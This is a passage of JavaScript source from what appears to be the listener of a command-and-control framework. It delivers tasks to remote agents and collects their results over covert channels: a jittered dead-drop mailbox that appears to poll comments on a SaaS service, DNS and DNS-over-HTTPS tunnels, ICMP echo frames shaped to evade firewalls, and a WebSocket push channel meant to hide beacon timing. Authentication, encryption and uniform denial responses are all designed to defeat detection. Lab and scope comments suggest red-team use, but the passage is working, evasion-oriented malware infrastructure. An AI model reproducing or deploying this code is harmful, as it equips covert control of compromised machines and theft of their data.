      polls: this._ghc ? this._ghc.polls : 0,
      lastPoll: this._ghc ? this._ghc.lastPoll : null,
      // Listener upstream proxy (operator directive): null = direct (unconfigured); when
      // applied, { applied, scheme, host, port, source } — credentials NEVER rendered.
      upstreamProxy: this._ghc ? this._ghc.upstreamProxy : null,
    };
  }

  // Jittered self-rescheduling poll (±GHC2_RATE.jitterPct). unref'd: the mailbox timer
  // never holds the process open. Slow by default — SaaS channels are low-and-slow.
  _armGhcTimer() {
    if (!this.ghc || !this._ghc || this.ghc.intervalSec <= 0) return;
    const base = this.ghc.intervalSec * 1000;
    const tick = async () => {
      await this.ghcPollNow();
      if (!this.ghc || !this._ghc || !this.server) return; // detached or disarmed mid-poll
      const gap = base + Math.round((Math.random() * 2 - 1) * base * GHC2_RATE.jitterPct);
      this._ghc.timer = setTimeout(tick, Math.max(1000, gap));
      if (this._ghc.timer.unref) this._ghc.timer.unref();
    };
    this._ghc.timer = setTimeout(tick, Math.max(1000, base));
    if (this._ghc.timer.unref) this._ghc.timer.unref();
  }

  // One mailbox poll/post cycle. NEVER throws — the result is data. Safe to call
  // concurrently-in-time (a slow poll never overlaps itself: re-entry is a no-op).
  async ghcPollNow() {
    const g = this.ghc, st = this._ghc;
    if (!g || !st) return { ok: false, reason: 'ghc not attached' };
    if (st.busy) return { ok: false, reason: 'a mailbox poll is already in flight' };
    st.busy = true;
    try {
      const res = await g.client.listComments();
      if (!res || res.ok !== true) {
        this._emit('ghc.error', { phase: 'list', status: res && res.status, error: (res && res.error) || 'list failed' });
        return { ok: false, reason: (res && res.error) || 'list failed' };
      }
      st.polls++;
      st.lastPoll = { at: Date.now(), comments: res.comments.length, bytes: res.bytes || 0, rateRemaining: res.rate ? res.rate.remaining : null, rateReset: res.rate ? res.rate.reset : null };
      const { ups, cursor } = upsFromComments(res.comments, st.cursor);
      st.cursor = cursor;
      this._emit('ghc.poll', { comments: res.comments.length, newUps: ups.length, bytes: res.bytes || 0, rateRemaining: st.lastPoll.rateRemaining, rateReset: st.lastPoll.rateReset });
      let delivered = 0;
      for (const up of ups) {
        const p = up.payload;
        const agentId = p && typeof p === 'object' ? String(p.a || '') : '';
        // Cursor bookkeeping per agent: the last mailbox comment id observed carrying
        // this agent's traffic (drives ghcStatus().byAgent; replay-safety itself comes
        // from the intake's strict seq, the cursor is the delivery-view layer).
        if (agentId) st.byAgent.set(agentId, up.id);
        this._emit('ghc.up', { agentId, commentId: up.id, bytes: up.bytes, kind: p && p.k === 'push' ? 'push' : 'pull' });
        const replyStr = this._dnsPayload(p, 'ghc-mailbox', 'ghc');
        if (!replyStr) continue; // idle/deny/push-ack: the uniform empty case, nothing to post
        const da = this.agents.get(agentId);
        if (!da) continue; // the intake accepted a payload for an agent record we lost — can't sign a down
        let taskId = null;
        try { taskId = JSON.parse(b32decode(replyStr).toString('utf8')).taskId || null; } catch { /* reply shape is the codec's; a decode miss only blanks the audit field */ }
        let body = null;
        try { body = downCommentBody({ agentId, replyStr, token: da.token }); } catch (e) {
          this._emit('ghc.down-failed', { agentId, taskId, error: String((e && e.message) || e) });
          continue;
        }
        const posted = await g.client.createComment(body);
        if (posted && posted.ok) {
          delivered++;
          this._emit('ghc.down', { agentId, taskId, bytes: body.length, commentId: posted.id || null });
        } else {
          // HONEST GAP (documented, same window the UDP wire has): the shared intake
          // already dequeued the task when its reply fails to post. The ledger shows
          // delivered-never-resulted and THIS event names it — a dead-drop post failure
          // is loud in the audit, never a silent loss.
          this._emit('ghc.down-failed', { agentId, taskId, status: posted && posted.status, error: (posted && posted.error) || 'post failed' });
        }
      }
      return { ok: true, ups: ups.length, delivered };
    } catch (e) {
      // The client contract is never-throw with token-free errors; a foreign client that
      // throws anyway lands here — still never fatal to the channel.
      this._emit('ghc.error', { phase: 'poll', error: String((e && e.message) || e).slice(0, 200) });
      return { ok: false, reason: 'poll failed' };
    } finally { st.busy = false; }
  }


  // Shared packet->reply core for BOTH the UDP socket and the DoH route (gap#2): parse
  // the wire query, run the governed intake, craft the TXT-answer packet. Returns the
  // response Buffer, or null when the packet isn't a parseable query (UDP: silent drop;
  // DoH: 400). Never throws. transport stays 'dns-codec' for UDP (legacy event shape);
  // the DoH route passes 'doh' so failover bookkeeping counts the wire it arrived on.
  _dnsWireReply(packetBytes, src, transport = 'dns-codec') {
    try {
      const q = parseDnsQuery(packetBytes);
      if (!q) return null;
      const p = decodeQuery(q.qname, { domain: this.dnsDomain });
      const replyStr = this._dnsPayload(p, src, transport);
      return craftDnsResponse(q, replyStr || '');
    } catch (e) {
      this._emit('dns.error', { error: (e && e.message) || String(e) });
      return null;
    }
  }

  // RFC 8484 DNS-over-HTTPS transport (gap#2), following the _armDns pattern: an https
  // server serving ONLY /dns-query. POST (content-type application/dns-message, body =
  // DNS wire packet) is primary; GET /dns-query?dns=<base64url packet> is supported too.
  // The body is the EXACT packet the UDP arm serves — one shared codec core above, zero
  // duplication. Denial keeps the zero-answer 200 shape (denial ≡ idle to an observer).
  async _armDoh() {
    let cert = null, key = null;
    if (this.doh.cert && this.doh.key) {
      cert = pemOrPath(this.doh.cert);
      key = pemOrPath(this.doh.key);
      if (!cert || !key) throw new Error('CallbackChannel: doh.cert/doh.key were supplied but did not read as PEM strings or PEM file paths');
      this._doh.certSource = 'provided';
    } else {
      // LAB ONLY (engine/doh-labcert.mjs): a fixed self-signed cert so the range works
      // out of the box with a stable thumbprint the agent pins. Never operator-grade.
      cert = DOH_LAB_CERT;
      key = DOH_LAB_KEY;
      this._doh.certSource = 'lab';
    }
    this._dohServer = https.createServer({ cert, key }, (req, res) => this._handleDoh(req, res));
    // Same doctrine as the http arm: a dying client (or a failed TLS handshake from a
    // port scan / wrong-protocol probe) must never take the channel down with it.
    this._dohServer.on('clientError', (e, sock) => { try { if (sock && !sock.destroyed) sock.destroy(); } catch {} });
    this._dohServer.on('tlsClientError', (e, sock) => { try { if (sock && !sock.destroyed) sock.destroy(); } catch {} });
    await new Promise((resolve, reject) => {
      this._dohServer.once('error', reject);
      this._dohServer.listen(this.doh.port, this.bind, resolve);
    });
    this._doh.armed = true;
    this._doh.port = this._dohServer.address().port;
    this._emit('channel.doh-armed', { bind: this.bind, port: this._doh.port, certSource: this._doh.certSource });
  }

  _handleDoh(req, res) {
    const remoteIp = req.socket.remoteAddress || '';
    // Out of the signed scope ring: silent drop, same doctrine as the UDP wire — an
    // out-of-scope observer gets nothing parseable at all.
    if (!ipAllowed(remoteIp, this.scope.cidrs)) { try { req.socket.destroy(); } catch {} return; }
    const bad = (code, msg) => {
      try {
        res.writeHead(code, { 'content-type': 'application/json', connection: 'close' });
        res.end(JSON.stringify({ error: msg }));
      } catch { /* socket already gone — nothing to answer */ }
    };
    const u = new URL(req.url, 'https://x');
    if (u.pathname !== '/dns-query') return bad(404, 'not found');
    const answer = (packet) => {
      res.writeHead(200, { 'content-type': 'application/dns-message', 'content-length': packet.length, connection: 'close' });
      res.end(packet);
    };
    if (req.method === 'GET') {
      const dns = u.searchParams.get('dns');
      if (!dns) return bad(400, 'missing dns query parameter');
      let packet = null;
      try { packet = Buffer.from(String(dns), 'base64url'); } catch { packet = null; }
      if (!packet || !packet.length) return bad(400, 'malformed dns query parameter');
      const out = this._dnsWireReply(packet, remoteIp, 'doh');
      if (!out) return bad(400, 'malformed dns wire packet');
      return answer(out);
    }
    if (req.method === 'POST') {
      const ct = String(req.headers['content-type'] || '').split(';')[0].trim().toLowerCase();
      if (ct !== 'application/dns-message') return bad(400, 'content-type must be application/dns-message');
      const chunks = [];
      let size = 0, tooBig = false;
      req.on('data', (d) => {
        size += d.length;
        if (size > 65535) { tooBig = true; req.destroy(); return; } // DNS messages are u16-bounded
        chunks.push(d);
      });
      req.on('end', () => {
        if (tooBig) return bad(400, 'oversized dns message');
        const out = this._dnsWireReply(Buffer.concat(chunks), remoteIp, 'doh');
        if (!out) return bad(400, 'malformed dns wire packet');
        answer(out);
      });
      req.on('error', () => { /* connection died mid-body — nothing to do */ });
      return;
    }
    return bad(405, 'method not allowed');
  }

  // Live ICMP transport status — the honest, observed truth about the bridge, for the
  // /api/channel view and for icmpCapability()'s live-verified flip.
  icmpStatus() {
    if (!this.icmp) return { configured: false };
    return { configured: true, ...this._icmp };
  }

  // fporacle: observe every request passively (JA4H + header shape into the ring).
  // Wrapped hard — the observer must NEVER change how the channel answers.
  _fpObserve(req) { try { this._fp.observe(req); } catch { /* passive observer only */ } }

  // The channel's fingerprint self-observation ring, for the /api/fp view.
  fpStatus() { return this._fp.status(); }

  // Spawn the bridge + wire its stdout JSON-lines. The bridge is a dumb byte pump; the
  // codec (icmpcodec) and governance (_dnsPayload: HMAC/seq/scope) stay in this process.
  _armIcmp() {
    const script = this.icmp.script || fileURLToPath(new URL('../agents/icmp-bridge.py', import.meta.url));
    const py = resolvePython(this.icmp.python);
    const spawnFn = this.icmp.spawnFn || defaultSpawn;
    let child;
    try {
      child = spawnFn(py.python, ['-u', script], { windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'] });
    } catch (e) {
      this._icmp = { armed: false, supported: false, reason: 'bridge spawn failed: ' + (e && e.message), liveVerified: false };
      this._emit('channel.icmp-error', { error: (e && e.message) || String(e) });
      return;
    }
    this._icmpChild = child;
    // Honesty window: a clean spawn proves NOTHING (the WindowsApps store stub launches
    // fine, nags on stderr, runs nothing). The capability line is the only proof of a
    // live bridge — none within the window, or the store text on stderr, means the
    // bridge is UNAVAILABLE and gets reported as such, never hung on.
    const capWindowMs = this.icmp.capWindowMs ?? 4000;
    let errBuf = '';
    const unavailable = (reason) => {
      if (!this._icmp || this._icmp.supported !== null) return; // capability already spoke
      if (this._icmpCapTimer) { clearTimeout(this._icmpCapTimer); this._icmpCapTimer = null; }
      this._icmp = { armed: false, supported: false, reason, liveVerified: false };
      this._emit('channel.icmp-capability', { supported: false, reason });
      if (this._icmpChild === child) this._icmpChild = null;
      try { child.kill(); } catch {}
    };
    this._icmpCapTimer = setTimeout(() => {
      this._icmpCapTimer = null;
      unavailable('bridge (' + py.python + ', ' + py.via + ') emitted no capability line within ' + capWindowMs + 'ms' +
        (errBuf.trim() ? ': ' + errBuf.trim().slice(-200) : ' — not a working interpreter?'));
    }, capWindowMs);
    if (this._icmpCapTimer.unref) this._icmpCapTimer.unref();
    let buf = '';
    child.stdout.on('data', (d) => {
      buf += d.toString('utf8');
      let nl;
      while ((nl = buf.indexOf('\n')) >= 0) {
        const line = buf.slice(0, nl).trim();
        buf = buf.slice(nl + 1);
        if (line) this._icmpLine(line);
      }
    });
    if (child.stderr) child.stderr.on('data', (d) => {
      errBuf = (errBuf + d.toString('utf8')).slice(-2000);
      if (PY_STORE_STUB.test(errBuf)) {
        unavailable('resolved python is the Windows Store stub, not an interpreter (' + py.python + ', ' + py.via + ') — install python or set VARVEL_ICMP_PYTHON to a real one');
      }
    });
    child.on('error', (e) => {
      if (this._icmpCapTimer) { clearTimeout(this._icmpCapTimer); this._icmpCapTimer = null; }
      this._icmp = { armed: false, supported: false, reason: 'bridge spawn failed: ' + (e && e.message), liveVerified: false };
      this._emit('channel.icmp-error', { error: (e && e.message) || String(e) });
    });
    child.on('exit', (code) => {
      if (this._icmpCapTimer) { clearTimeout(this._icmpCapTimer); this._icmpCapTimer = null; }
      const was = this._icmp || {};
      this._icmpChild = null;
      this._icmp = {
        armed: false,
        supported: !!was.supported,
        liveVerified: !!was.liveVerified,
        reason: was.supported === false ? (was.reason || 'bridge exited') : 'bridge exited (code ' + code + ')' + (errBuf.trim() ? ': ' + errBuf.trim().slice(-200) : ''),
      };
      this._emit('channel.icmp-exit', { code });
    });
  }

  _icmpLine(line) {
    let msg;
    try { msg = JSON.parse(line); } catch { this._emit('channel.icmp-error', { error: 'bridge emitted a non-JSON line' }); return; }
    if (msg.op === 'capability') {
      if (this._icmpCapTimer) { clearTimeout(this._icmpCapTimer); this._icmpCapTimer = null; }
      this._icmp.armed = !!msg.supported;
      this._icmp.supported = !!msg.supported;
      this._icmp.reason = String(msg.reason || '');
      this._emit('channel.icmp-capability', { supported: !!msg.supported, reason: this._icmp.reason });
      // Unsupported = unprivileged host: the bridge exits itself; make sure of it.
      if (!msg.supported && this._icmpChild) { try { this._icmpChild.kill(); } catch {} }
      return;
    }
    if (msg.op === 'recv') this._icmpRecv(msg);
  }

  // Inbound VARVEL ICMP frame: scope ring (silent drop, same as the UDP path) → codec
  // parse (checksum+magic, fail-closed) → frame reassembly → the SHARED governed intake.
  _icmpRecv(msg) {
    const src = String(msg.src || '');
    if (!ipAllowed(src, this.scope.cidrs)) return; // silent drop out-of-scope
    const frame = parseIcmpPacket(Buffer.from(String(msg.packetB64 || ''), 'base64'));
    if (!frame) return;                       // kernel ICMP noise / not ours — ignore
    // Agents may frame as echo REQUESTS (8) OR echo REPLIES (0): type-0 agent->channel
    // is the malleable shape for networks whose firewall blocks inbound echo requests
    // (the default Windows rule on public profiles) — unsolicited replies are not
    // filtered OUTBOUND. kind 'reply' is refused: no legitimate reply-kind frame ever
    // arrives here (our own replies are type 0 — kernels don't auto-answer replies,
    // and the agent's solicitation probe carries no magic to echo back).
    if ((frame.type !== 8 && frame.type !== 0) || (frame.kind !== 'pull' && frame.kind !== 'push')) return;
    let body = null;
    if (frame.cnt === 1) {
      body = frame.data;
    } else {
      const key = src + ':' + frame.seq + ':' + frame.kind;
      if (this._icmpFrames.size > 256) { // bounded: expire stale sessions, then drop-oldest
        const now = Date.now();
        for (const [k, s] of this._icmpFrames) if (now - s.at > 30_000) this._icmpFrames.delete(k);
        if (this._icmpFrames.size > 256) this._icmpFrames.delete(this._icmpFrames.keys().next().value);
      }
      let sess = this._icmpFrames.get(key);
      if (!sess) { sess = { frames: [], at: Date.now() }; this._icmpFrames.set(key, sess); }
      sess.frames.push(frame);
      try { body = reassemble(sess.frames); } catch { this._icmpFrames.delete(key); this._emit('checkin.rejected', { reason: 'icmp-reassemble', remoteIp: src }); return; }
      if (!body) return; // still incomplete
      this._icmpFrames.delete(key);
    }
    const p = decodeQuery(body.toString('utf8'), { domain: this.dnsDomain });
    // An authenticated frame advancing the agent's seq is a REAL observed round trip —
    // the only evidence allowed to flip the capability story to live-verified.
    const before = p && this.agents.get(p.a) ? this.agents.get(p.a).seq : null;
    const replyStr = this._dnsPayload(p, src, 'icmp');
    const after = p && this.agents.get(p.a) ? this.agents.get(p.a).seq : null;
    if (before != null && after != null && after > before) this._icmp.liveVerified = true;
    if (frame.kind !== 'pull') return;        // push frames get no application reply
    // Replies ride echo-REQUEST frames (type 8), codec-chunked past a frame's 512B,
    // id 0x5602. Win11 raw-socket contract, range-proven end to end: python raw-socket
    // echo-REPLY (type 0) sends are SILENTLY DROPPED off-loopback (matrix7: the type-0
    // frame never reached the guest NIC; the type-8 frame crossed and the guest's
    // RCVALL socket logged it). The agent's parser accepts types 0/8 and matches on
    // the VC kind+seq, so type 8 is transparent to it; the guest kernel's auto-answer
    // is a verbatim copy (harmless duplicate chunk) and its inbound echo here is
    // rejected by the pull/push kind filter above.
    for (const chunk of chunkPayload(Buffer.from(replyStr || '', 'utf8'))) {
      const out = icmpPacket({ type: 8, id: 0x5602, seq: frame.seq, kind: 'reply', idx: chunk.idx, cnt: chunk.cnt, data: chunk.data });
      this._icmpSend(src, out);
    }
  }

  _icmpSend(dst, packet) {
    const child = this._icmpChild;
    if (!child || !this._icmp || !this._icmp.armed) return false;
    try {
      child.stdin.write(JSON.stringify({ id: ++this._icmpMsgId, op: 'send', dst, packetB64: packet.toString('base64') }) + '\n');
      return true;
    } catch { return false; }
  }

  // Reject 204-UNIFORM: unknown agent / bad auth / stale seq / killed / out-of-scope /
  // malformed — all identical to "nothing for you". The reason goes to the LEDGER only.
  _reject(res, reason, obj = {}) {
    this._emit('checkin.rejected', { reason, ...obj });
    res.writeHead(204, { 'content-length': '0', connection: 'close' });
    res.end();
  }

  // ——— Envelope encryption (engine/envelope): the AEAD content layer ———
  // The key is derived per agent from the STORED credential (HKDF info 'varvel-env:'+
  // agentId) — cached on the record; a relay parent holds only the 'varvel-link:'
  // domain keys and can derive neither the token nor this key.
  _encKey(a) {
    if (!a._encKey) a._encKey = deriveEncKey(a.token, a.agentId);
    return a._encKey;
  }

  // Capability ratchet: called ONLY after the envelope's HMAC has verified (or a sealed
  // chunk actually opened — proof of key possession). Never moves down.
  _encRatchet(a, via, transport) {
    if (a.enc === true || this.encMode === 'off') return;
    a.enc = true;
    this._emit('enc.negotiated', { agentId: a.agentId, via, transport });
  }

  // Mode gate for a PULL-shaped envelope (no content of its own; the capability flag is
  // what required mode demands). Returns null when admitted, else the reject reason.
  // Post-auth only: an unauthenticated envelope never reaches this (bad-auth first).
  _encPullReject(ecOk) {
    if (this.encMode === 'required' && !ecOk) return 'enc-required';
    return null;
  }

  // Seal a DOWN reply string for an enc-proven agent (task JSON b32 on codec wires, the
  // /c body, a ws frame payload). '' (idle/deny) is NEVER sealed — the uniform empty
  // answer is the denial doctrine; content-vs-nothing is the same shape as today.
  _sealDown(a, replyStr) {
    if (!replyStr || a.enc !== true || this.encMode === 'off') return replyStr;
    return sealString(this._encKey(a), replyStr);
  }

  // Open or admit UP CONTENT bytes (a decoded push chunk `d`, or the raw http /r body).
  // Encrypt-then-MAC: the caller has ALREADY verified the HMAC over these exact bytes,
  // so the AEAD open here never sees a forgery (no decryption oracle). Returns
  // { ok:true, data } or { ok:false, reason } after emitting the crypto-level audit
  // ('enc.open-failed'); the caller adds its uniform reject with the same reason.
  _openContent(a, buf, ctx = {}) {
    const base = { agentId: a.agentId, ...ctx };
    if (isSealedBytes(buf)) {
      if (this.encMode === 'off') return { ok: false, reason: 'enc-disabled' };
      try {
        const data = openBytes(this._encKey(a), buf);
        this._encRatchet(a, 'sealed-content', ctx.transport);
        return { ok: true, data };
      } catch (e) {
        this._emit('enc.open-failed', { ...base, code: (e && e.code) || 'open' });
        return { ok: false, reason: 'enc-open-failed' };
      }
    }
    if (this.encMode === 'required') return { ok: false, reason: 'enc-required' };
    if (a.enc === true) return { ok: false, reason: 'enc-downgrade' }; // enc-proven agent sending cleartext content
    return { ok: true, data: buf };
  }

  // Shared DNS-codec payload handling (pull + chunked push), used by BOTH the HTTP /d route
  // and the real-UDP DNS listener. p = decoded query payload; returns the reply STRING
  // ('' = the codec's uniform idle/deny case — a killed agent is indistinguishable from idle).
  _dnsPayload(p, remoteIp, transport = 'dns-codec') {
    const da = p && this.agents.get(p.a);
    const dseq = p && Number(p.s);
    if (!da || da.killed || !Number.isInteger(dseq) || dseq <= da.seq) { this._emit('checkin.rejected', { reason: 'dns-reject', remoteIp }); return ''; }

    // --- result PUSH (chunked): per-chunk HMAC, reassembled into _intakeResult ---
    if (p.k === 'push') {
      const t = da.ledger.get(String(p.t || ''));
      const i = Number(p.i), n = Number(p.n), d = String(p.d || '');
      const expect = hmac(da.token, [p.a, dseq, p.t, i, n, d].join(':'));
      if (!t || !Number.isInteger(i) || !Number.isInteger(n) || i < 0 || n < 1 || n > 5000 || i >= n || !/^[A-Za-z0-9+/=]*$/.test(d) || p.h !== expect) {
        this._emit('checkin.rejected', { reason: 'dns-push-reject', agentId: p.a, remoteIp });
        return '';
      }
      // Envelope layer (encrypt-then-MAC): the HMAC above authenticated the CIPHERTEXT
      // bytes; only now does the AEAD open run — a forgery never reaches it. Plaintext
      // is mode-gated ('enc-required' / 'enc-downgrade' / 'enc-disabled').
      const opened = this._openContent(da, Buffer.from(d, 'base64'), { remoteIp, transport, taskId: t.taskId });
      if (!opened.ok) { this._emit('checkin.rejected', { reason: opened.reason, agentId: p.a, remoteIp, transport }); return ''; }
      da.seq = dseq; da.checkins++; da.lastSeen = Date.now(); da.remoteIp = remoteIp;
      // gap#6: the chunk's base64 length is the application bytes this push event
      // carried on the wire (dns qname / ws frame payload) - the flow ring's size signal.
      this._tagTransport(da, transport, d.length);
      if (!da._pushBuf) da._pushBuf = new Map();
      let sess = da._pushBuf.get(t.taskId);
      if (!sess) { sess = { n, chunks: new Array(n).fill(null), got: 0, at: Date.now() }; da._pushBuf.set(t.taskId, sess); }
      if (sess.n !== n) { da._pushBuf.delete(t.taskId); this._emit('checkin.rejected', { reason: 'dns-push-nchange', agentId: p.a, remoteIp }); return ''; }
      if (sess.chunks[i] === null) { sess.chunks[i] = opened.data.toString('base64'); sess.got++; } // the OPENED chunk: reassembly + storage stay plaintext (listener-at-rest residual, documented)
      this._emit('agent.push', { agentId: p.a, taskId: t.taskId, chunk: i + 1, of: n, transport });
      if (sess.got < sess.n) return '';
      da._pushBuf.delete(t.taskId);
      const body = Buffer.from(sess.chunks.join(''), 'base64');
      // Store the full body like the HTTP /r route does — a pushed result over ANY codec
      // transport must be drainable via results(), not just the 120-char ledger preview.
      da.results.push({ taskId: t.taskId, data: body.toString('utf8'), receivedAt: Date.now() });
      while (da.results.length > MAX_RESULTS) da.results.shift();
      this._intakeResult(da, t.taskId, body);
      this._emit('task.resulted', { agentId: p.a, taskId: t.taskId, bytes: body.length, transport });
      return '';
    }

    // --- task PULL ---
    const pullH = hmac(da.token, p.a + ':' + dseq + ':pull');
    const padH = hmac(da.token, p.a + ':' + dseq + ':pad');
    if (p.h !== pullH && p.h !== padH) { this._emit('checkin.rejected', { reason: 'bad-auth', agentId: p.a, remoteIp }); return ''; }
    // Envelope layer: the capability flag rides the authenticated envelope (ec:1). In
    // required mode a capability-less pull IS a plaintext envelope — refused loudly.
    const ecOk = p.ec === 1;
    const pullRefuse = this._encPullReject(ecOk);
    if (pullRefuse) { this._emit('checkin.rejected', { reason: pullRefuse, agentId: p.a, remoteIp, transport }); return ''; }
    da.seq = dseq; da.checkins++; da.lastSeen = Date.now(); da.remoteIp = remoteIp;
    if (ecOk) this._encRatchet(da, 'capability', transport);
    this._tagTransport(da, transport);
    if (p.h === padH && p.h !== pullH) {
      // padding dummy on a codec wire — audited as itself, never carries task semantics
      this._emit('agent.pad', { agentId: p.a, seq: dseq, remoteIp, transport, padding: true });
      return '';
    }
    this._emit('agent.checkin', { agentId: p.a, seq: dseq, remoteIp, transport });
    // Batch/dwell hold applies on codec wires too (single-task replies stay codec-fixed —
    // the burst shape is an http-leg feature; hold semantics are transport-independent).
    const dt = this._drainDeliverable(da, Date.now(), 1)[0] || null;
    if (!dt) return '';
    this._emit('task.delivered', { agentId: p.a, taskId: dt.taskId, kind: dt.kind, transport });
    const reply = { taskId: dt.taskId, kind: dt.kind, data: dt.data };
    // Channel-assigned transport (gap#5): no header channel exists on this wire, so the
    // switch request rides the NEXT non-empty task reply as a machine-only key.
    if (da.assignedTransport) reply.setTransport = da.assignedTransport.transport;
    // Envelope layer: the task CONTENT seals for enc-proven agents — on the pivot mesh
    // this string is exactly what a relay parent would otherwise read in the clear.
    return this._sealDown(da, encodeReply(reply));
  }

  // --- gap#4: WebSocket PUSH transport (RFC 6455 on the SAME channel http server) ---
  // /ws is the FIRST push transport: tasks are delivered as frames the instant they are
  // queued (see task()), so the agent holds NO polling cadence on this wire - polling
  // periodicity is the beacon signal this transport exists to kill. Consequently there
  // is NO app-level heartbeat: ping/pong heartbeats would recreate exactly that wire
  // periodicity. Liveness is agent-side (a dead socket fails the agent's cycle, which
  // its failover logic counts like any dead wire).
  //
  // DENIAL SHAPE (documented divergence): ws denial is an OBSERVABLE 403 + socket end,
  // in the http-transport family of refusals - NOT the dns wire's zero-answer
  // camouflage. A websocket handshake cannot carry a "zero-answer TXT" shape; refusing
  // the upgrade plainly is the honest shape for this wire. Out-of-scope source IPs keep
  // the DoH doctrine: silent destroy, nothing parseable at all.
  _handleUpgrade(req, socket, head) {
    this._fpObserve(req);
    const remoteIp = req.socket.remoteAddress || '';
    if (!ipAllowed(remoteIp, this.scope.cidrs)) { try { socket.destroy(); } catch {} return; }
    const u = new URL(req.url, 'http://x');
    if (u.pathname !== '/ws') { try { socket.destroy(); } catch {} return; } // /ws only - nothing else consumes upgrades here
    const deny = (reason, obj = {}) => {
      this._emit('checkin.rejected', { reason, ...obj });
      try {
        socket.write('HTTP/1.1 403 Forbidden\r\ncontent-length: 0\r\nconnection: close\r\n\r\n');
        socket.end();
      } catch { /* socket already gone */ }
    };
    const key = req.headers['sec-websocket-key'];
    const upgrade = String(req.headers.upgrade || '').toLowerCase();
    const conn = String(req.headers.connection || '').toLowerCase();
    if (req.method !== 'GET' || upgrade !== 'websocket' || !conn.includes('upgrade') || !key || String(req.headers['sec-websocket-version'] || '') !== '13') {
      return deny('ws-malformed', { remoteIp });
    }
    // Pre-upgrade auth, same governed shape as a pull: GET /ws?a=<id>&s=<seq>&h=<hmac(token, id:seq:ws)>.
    // Strictly-increasing seq applies here exactly like /c: a replayed handshake is a replay.
    const agentId = String(u.searchParams.get('a') || '');
    const seq = Number(u.searchParams.get('s'));
    const h = String(u.searchParams.get('h') || '');
    const da = this.agents.get(agentId);
    if (!da) return deny('unknown-agent', { remoteIp });
    if (da.killed) return deny('killed-agent', { agentId, remoteIp });
    if (!Number.isInteger(seq) || seq <= da.seq) return deny('stale-seq', { agentId, seq, remoteIp });
    if (h !== hmac(da.token, agentId + ':' + seq + ':ws')) return deny('bad-auth', { agentId, remoteIp });
    // Envelope layer: the enc capability rides the handshake query (?ec=1); required
    // mode refuses a capability-less upgrade loudly (the ws-family denial shape: 403).
    const ecOk = u.searchParams.get('ec') === '1';
    if (this.encMode === 'required' && !ecOk) return deny('enc-required', { agentId, remoteIp });

    // 101 handshake, then wrap the socket in a session on the agent record (da._ws).
    try {
      socket.write('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ' + acceptKey(key) + '\r\n\r\n');
      socket.setNoDelay(true);
    } catch { try { socket.destroy(); } catch {} return; }
    // A reconnect REPLACES any stale session (the old socket is already dead or dying).
    if (da._ws) this._wsClose(da, da._ws, 'replaced');
    const sess = { socket, parser: new WsParser({ expectMask: true }), open: true, agentId };
    da._ws = sess;
    this._wsSessions.add(sess);
    socket.on('data', (chunk) => this._wsData(da, sess, chunk, remoteIp));
    // 'end' (peer FIN) MUST tear the session down: upgraded sockets are detached from
    // the http server's lifecycle, so a half-closed socket never emits 'close' until
    // we destroy our side (range-proven: agent destroy() -> 'end', 'close' never fires).
    socket.on('end', () => this._wsClose(da, sess, 'peer-fin'));
    socket.on('error', () => { /* close/end follows - never throws into the channel */ });
    socket.on('close', () => this._wsClose(da, sess, 'closed'));
    // The connection itself counts as an observed check-in on the ws wire (bucket +
    // lastSeen); every received payload frame tags again via the shared intake.
    da.seq = seq; da.checkins++; da.lastSeen = Date.now(); da.remoteIp = remoteIp;
    if (ecOk) this._encRatchet(da, 'capability', 'ws');
    this._tagTransport(da, 'ws');
    this._emit('agent.checkin', { agentId, seq, remoteIp, transport: 'ws' });
    this._emit('agent.ws-open', { agentId, remoteIp });
    // Flush everything queued while the agent was off-wire, as frames, immediately.
    this._wsFlush(da);
    // Bytes that arrived with the upgrade request (rare but legal) are frame data.
    if (head && head.length) this._wsData(da, sess, head, remoteIp);
  }

  // Feed one TCP chunk through the streaming parser and route complete frames. A WsError
  // is fail-closed: echo the close status, drop the session, destroy the socket.
  _wsData(da, sess, chunk, remoteIp) {
    if (!sess.open) return;
    let frames;
    try { frames = sess.parser.feed(chunk); } catch (e) {
      this._emit('checkin.rejected', { reason: 'ws-protocol', agentId: da.agentId, remoteIp, error: (e && e.message) || String(e) });
      if (e instanceof WsError) { try { sess.socket.write(buildFrame({ opcode: OP_CLOSE, payload: Buffer.from([(e.code >> 8) & 0xff, e.code & 0xff]) })); } catch {} }
      this._wsClose(da, sess, 'protocol-violation');
      return;
    }
    for (const f of frames) this._wsFrame(da, sess, f, remoteIp);
  }

  _wsFrame(da, sess, f, remoteIp) {
    if (!sess.open) return;
    if (f.opcode === OP_PING) { // wire-level liveness from the peer: pong verbatim, that's all
      try { sess.socket.write(buildFrame({ opcode: OP_PONG, payload: f.payload })); } catch { this._wsClose(da, sess, 'write-failed'); }
      return;
    }
    if (f.opcode === OP_PONG) return; // nothing of ours pings - an unsolicited pong is noise
    if (f.opcode === OP_CLOSE) { // polite echo, then teardown
      try { sess.socket.write(buildFrame({ opcode: OP_CLOSE, payload: f.payload })); } catch {}
      try { sess.socket.end(); } catch {}
      this._wsClose(da, sess, 'peer-close');
      return;
    }
    // Data frame: the client speaks the SAME JSON object shape as the dns queries, into
    // the SAME governed intake (per-chunk HMAC, agent-global strict seq, reassembly).
    let p = null;
    try { p = JSON.parse(f.payload.toString('utf8')); } catch { p = null; }
    if (!p || typeof p !== 'object') { this._emit('checkin.rejected', { reason: 'ws-badjson', agentId: da.agentId, remoteIp }); return; }
    const replyStr = this._dnsPayload(p, remoteIp, 'ws');
    // A pull-shaped frame is legal through the shared intake; deliver its reply as a
    // frame so nothing dequeued is ever dropped (the real agent never pulls on ws -
    // tasks arrive pushed - but the intake is shared and stays lossless).
    if (replyStr) {
      if (isSealedString(replyStr)) { this._wsSendText(sess, replyStr); } // envelope-sealed reply: the string IS the frame payload
      else { try { this._wsSend(sess, JSON.parse(b32decode(replyStr).toString('utf8'))); } catch { /* undeliverable reply - queue semantics unchanged */ } }
    }
  }

  // Write one task/JSON object as a single text frame. Returns false on a dead socket.
  _wsSend(sess, obj) {
    if (!sess.open) return false;
    try {
      sess.socket.write(buildFrame({ opcode: 1, payload: Buffer.from(JSON.stringify(obj), 'utf8') }));
      return true;
    } catch { return false; }
  }

  // Raw-string variant: a sealed envelope string ('enc1:…') is the payload AS-IS —
  // JSON.stringify would quote it and break the agent's isSealedString check.
  _wsSendText(sess, str) {
    if (!sess.open) return false;
    try {
      sess.socket.write(buildFrame({ opcode: 1, payload: Buffer.from(String(str), 'utf8') }));
      return true;
    } catch { return false; }
  }

